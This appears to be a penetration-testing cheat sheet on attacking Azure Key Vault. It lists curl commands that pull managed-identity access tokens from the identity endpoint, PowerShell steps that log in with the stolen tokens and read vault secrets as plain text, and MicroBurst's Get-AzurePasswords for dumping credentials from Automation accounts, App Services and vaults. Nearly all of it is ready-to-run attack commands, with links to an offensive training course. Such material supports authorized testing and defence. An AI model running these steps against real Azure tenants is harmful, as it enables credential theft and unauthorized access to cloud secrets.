# Azure Services - KeyVault

## Access Token

* Keyvault access token
    ```powershell
    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
    ```

* Connect with the access token
    ```ps1
    PS> $token = 'eyJ0..'
    PS> $keyvaulttoken = 'eyJ0..'
    PS> $accid = '2e...bc'
    PS Az> Connect-AzAccount -AccessToken $token -AccountId $accid -KeyVaultAccessToken $keyvaulttoken
    ```

## Query Secrets 

* Query the vault and the secrets
    ```ps1
    PS Az> Get-AzKeyVault
    PS Az> Get-AzKeyVaultSecret -VaultName <VaultName>
    PS Az> Get-AzKeyVaultSecret -VaultName <VaultName> -Name Reader -AsPlainText
    ```

* Extract secrets from Automations, AppServices and KeyVaults
    ```powershell
    Import-Module Microburst.psm1
    PS Microburst> Get-AzurePasswords
    PS Microburst> Get-AzurePasswords -Verbose | Out-GridView
    ```

## References

* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)